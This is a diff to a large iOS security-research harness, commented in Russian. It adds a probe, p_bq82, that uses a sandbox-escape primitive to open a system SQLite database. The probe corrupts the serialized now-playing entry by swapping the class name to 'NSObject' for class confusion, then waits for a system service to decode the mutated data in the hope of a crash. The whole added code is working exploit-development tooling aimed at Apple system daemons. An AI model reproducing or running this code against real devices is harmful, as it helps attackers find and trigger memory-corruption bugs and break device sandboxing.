@@ -43044,6 +43044,222 @@ static void p_bq81(void) {
     LOG("[bq81] фоновый запуск...");
 }
 
+// p_bq82 — v237: LNValue-мутации в NOW-PLAYING feed (гарантированный
+// триггер). §229: media.groupingInfo не перечитывается (output-файл);
+// nowPlaying.localPlayingMedia mediaremoted обновляет каждую секунду →
+// сервис WRITE-ит → его reader декодирует существующие entries при
+// merge → НАШИ байты попадут в LNValue-декодер. Мутации с УДЕРЖАНИЕМ
+// (не восстанавливаем — сервис гарантированно встретит).
+static void p_bq82(void) {
+    LOG("[bq82] v237: LNValue-мутации в nowPlaying feed (live-триггер)");
+    fsync(fileno(stderr));
+    dispatch_queue_t q = dispatch_queue_create("bq82.q", DISPATCH_QUEUE_SERIAL);
+    int ctl = 0;
+    char tag[64];
+    {
+        int n = 0;
+        xpc_object_t m = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_object_t seq[1] = { m };
+        bq51_run(q, "ctl-empty", seq, 1, 1, &n, tag, sizeof(tag));
+        if (!strcmp(tag, "invalidate")) ctl = 1;
+        LOG("[bq82] ctl-empty: nev=%d tag=%s -> control %s",
+            n, tag[0] ? tag : "-", ctl ? "OK" : "FAILED");
+    }
+    if (!ctl) { LOG("[bq82] CONTROL FAILED (§144)"); return; }
+    fsync(fileno(stderr));
+
+    dispatch_async(dispatch_get_main_queue(), ^{
+    @try {
+        const char *dbPath = "/var/containers/Data/System/"
+            "8EB68272-6502-49E9-B688-25CA4774CFE4/db";
+        struct stat st82 = {0};
+        if (stat(dbPath, &st82) != 0) {
+            const char *grp = "group.9e66ab897d52ea95.1";
+            const uint64_t F_DEF = 0x0000008000000000ULL;
+            int64_t h = bq_custom("/var/containers/Data/System", 0,
+                                   grp, 7, F_DEF, 3);
+            if (h < 0 || stat(dbPath, &st82) != 0) {
+                LOG("[bq82] escape/stat FAILED"); return;
+            }
+            LOG("[bq82] escape OK (§170)");
+        }
+        sqlite3 *db = NULL;
+        int rc = sqlite3_open(dbPath, &db);
+        LOG("[bq82] sqlite3_open(RW) -> %d", rc);
+        if (rc != SQLITE_OK) {
+            LOG("[bq82] open failed"); sqlite3_close(db); return;
+        }
+
+        // динамический выбор: ПЕРВАЯ запись в feedEntries (самая живая)
+        sqlite3_stmt *rd = NULL;
+        rc = sqlite3_prepare_v2(db,
+            "SELECT lnValue, feedId, entityId FROM feedEntries "
+            "ORDER BY lastUpdate DESC LIMIT 1",
+            -1, &rd, NULL);
+        if (rc != SQLITE_OK) {
+            LOG("[bq82] SELECT failed: %s", sqlite3_errmsg(db));
+            sqlite3_close(db); return;
+        }
+        const void *lnOrig = NULL;
+        int lnLen = 0;
+        char feedId[128] = "", entityId[256] = "";
+        if (sqlite3_step(rd) == SQLITE_ROW) {
+            lnOrig = sqlite3_column_blob(rd, 0);
+            lnLen = sqlite3_column_bytes(rd, 0);
+            snprintf(feedId, sizeof(feedId), "%s",
+                sqlite3_column_text(rd, 1) ?: "?");
+            snprintf(entityId, sizeof(entityId), "%s",
+                sqlite3_column_text(rd, 2) ?: "?");
+            LOG("[bq82] base: feedId=%s lnValue=%d bytes", feedId, lnLen);
+        } else {
+            LOG("[bq82] feedEntries ПУСТАЯ (сервис очистил)");
+            sqlite3_finalize(rd); sqlite3_close(db); return;
+        }
+        if (!lnOrig || lnLen < 16) {
+            LOG("[bq82] lnValue пустой");
+            sqlite3_finalize(rd); sqlite3_close(db); return;
+        }
+        unsigned char *orig = malloc(lnLen);
+        memcpy(orig, lnOrig, lnLen);
+        sqlite3_finalize(rd);
+
+        // БЭКАП оригинала В ОТДЕЛЬНОЙ ТАБЛИЦЕ (для восстановления)
+        {
+            sqlite3_exec(db,
+                "CREATE TABLE IF NOT EXISTS bq82_backup ("
+                "feedId TEXT, entityId TEXT, lnValue BLOB)", 0, 0, 0);
+            sqlite3_stmt *bk = NULL;
+            rc = sqlite3_prepare_v2(db,
+                "INSERT OR REPLACE INTO bq82_backup VALUES "
+                "('nowPlaying.localPlayingMedia', ?, ?)",
+                -1, &bk, NULL);
+            if (rc == SQLITE_OK) {
+                sqlite3_bind_text(bk, 1, feedId, -1, SQLITE_TRANSIENT);
+                sqlite3_bind_blob(bk, 2, orig, lnLen, SQLITE_TRANSIENT);
+                sqlite3_step(bk);
+                LOG("[bq82] бэкап в bq82_backup (%d bytes)", lnLen);
+            }
+            sqlite3_finalize(bk);
+        }
+
+        // МУТАЦИЯ: $classname подмена (самая ценная — class confusion)
+        // Ищем "$classname" в bplist00 и подменяем следующий класс
+        int mutApplied = 0;
+        unsigned char *mut = malloc(lnLen);
+        memcpy(mut, orig, lnLen);
+        {
+            static const unsigned char findCls[] = "$classname";
+            for (int i = 0; i + 20 < lnLen; i++) {
+                if (memcmp(mut + i, findCls, 9) == 0) {
+                    // подменяем 8 printable байтов после "$classname"
+                    for (int j = i + 9; j + 8 < lnLen && j < i + 80; j++) {
+                        BOOL printable = YES;
+                        for (int k = 0; k < 8; k++) {
+                            if (!isprint(mut[j+k])) { printable = NO; break; }
+                        }
+                        if (printable) {
+                            memcpy(mut + j, "NSObject", 8);
+                            mutApplied = 1;
+                            LOG("[bq82] *** $classname подменён на "
+                                "NSObject @offset %d ***", j);
+                            break;
+                        }
+                    }
+                    if (mutApplied) break;
+                }
+            }
+        }
+        if (!mutApplied) {
+            // fallback: tail ^= FF (проще, но тоже валидно)
+            mut[lnLen-1] ^= 0xFF;
+            mut[lnLen-2] ^= 0xFF;
+            mutApplied = 2;
+            LOG("[bq82] $classname не найден — tail ^= FF (fallback)");
+        }
+
+        // ЗАПИСЬ МУТАЦИИ (БЕЗ восстановления!)
+        {
+            sqlite3_stmt *up = NULL;
+            rc = sqlite3_prepare_v2(db,
+                "UPDATE feedEntries SET lnValue=? "
+                "WHERE feedId=?",
+                -1, &up, NULL);
+            if (rc == SQLITE_OK) {
+                sqlite3_bind_blob(up, 1, mut, lnLen, SQLITE_TRANSIENT);
+                sqlite3_bind_text(up, 2, feedId, -1, SQLITE_TRANSIENT);
+                int ur = sqlite3_step(up);
+                LOG("[bq82] *** UPDATE lnValue (%s) -> %d *** ",
+                    mutApplied == 1 ? "$classname=NSObject" : "tail^FF",
+                    ur);
+                if (ur == SQLITE_DONE) {
+                    LOG("[bq82] *** МУТАЦИЯ В БД — сервис перечитает при "
+                        "следующем mediaremoted WRITE! ***");
+                }
+            } else {
+                LOG("[bq82] UPDATE failed: %s", sqlite3_errmsg(db));
+            }
+            sqlite3_finalize(up);
+        }
+        free(mut);
+
+        // ждём 45с (mediaremoted пишет каждые ~1-2с → много триггеров)
+        LOG("[bq82] удержание 45с (сервис WRITE-ит nowPlaying каждые "
+            "1-2с — декодер встретит мутацию)");
+        for (int t = 0; t < 9; t++) {
+            usleep(5000000);
+            LOG("[bq82] ...%ds (мутация живёт в БД)", (t + 1) * 5);
+            fsync(fileno(stderr));
+        }
+        // проверяем: перезаписал ли сервис нашу мутацию?
+        {
+            sqlite3_stmt *ck = NULL;
+            rc = sqlite3_prepare_v2(db,
+                "SELECT lnValue FROM feedEntries "
+                "WHERE feedId=? LIMIT 1",
+                -1, &ck, NULL);
+            sqlite3_bind_text(ck, 1, feedId, -1, SQLITE_TRANSIENT);
+            if (rc == SQLITE_OK && sqlite3_step(ck) == SQLITE_ROW) {
+                const void *now = sqlite3_column_blob(ck, 0);
+                int nowLen = sqlite3_column_bytes(ck, 0);
+                if (now && nowLen == lnLen && memcmp(now, orig, lnLen) == 0) {
+                    LOG("[bq82] мутация ПЕРЕЗАПИСАНА сервисом "
+                        "(оригинал вернулся — сервис WRITE заменил)");
+                } else if (now && nowLen > 0) {
+                    LOG("[bq82] данные изменены (%d bytes) — сервис "
+                        "перезаписал живыми данными", nowLen);
+                } else {
+                    LOG("[bq82] запись УДАЛЕНА сервисом");
+                }
+            }
+            sqlite3_finalize(ck);
+        }
+        // ВОССТАНОВЛЕНИЕ из бэкапа
+        {
+            sqlite3_stmt *rb = NULL;
+            rc = sqlite3_prepare_v2(db,
+                "UPDATE feedEntries SET lnValue=? "
+                "WHERE feedId=?",
+                -1, &rb, NULL);
+            if (rc == SQLITE_OK) {
+                sqlite3_bind_blob(rb, 1, orig, lnLen, SQLITE_TRANSIENT);
+                sqlite3_bind_text(rb, 2, feedId, -1, SQLITE_TRANSIENT);
+                sqlite3_step(rb);
+                LOG("[bq82] ОРИГИНАЛ ВОССТАНОВЛЕН");
+            }
+            sqlite3_finalize(rb);
+        }
+        free(orig);
+        sqlite3_close(db);
+        LOG("[bq82] done — crashdiff решает (LiveEntityService "
+            "декодировал мутацию при mediaremoted WRITE)");
+    } @catch (NSException *e) {
+        LOG("[bq82] ИСКЛ: %s — %s", e.name.UTF8String ?: "?",
+            e.reason ? e.reason.UTF8String : "?");
+    }
+    });
+    LOG("[bq82] фоновый запуск...");
+}
+
 // p_astris — v192: существует ли AppleAstrisGpioProbe в IORegistry
 // УСТРОЙСТВА из песочницы (matching без open, нулевой риск) и что
 // отдаёт IOServiceGetMatchingService. Контекст: в VM-госте IOServiceOpen
@@ -50551,6 +50767,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_BQ79")) { p_bq79(); LOG("[probe13] bq79-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ80")) { p_bq80(); LOG("[probe13] bq80-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ81")) { p_bq81(); LOG("[probe13] bq81-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ82")) { p_bq82(); LOG("[probe13] bq82-only mode, stop"); return NULL; }
         if (getenv("FUZZ_XPCENUM")) { p_xpcenum(); LOG("[xpcen] xpcenum-only mode, stop"); return NULL; }
         if (getenv("FUZZ_ASTRIS")) { p_astris(); LOG("[probe13] astris-only mode, stop"); return NULL; }
         if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
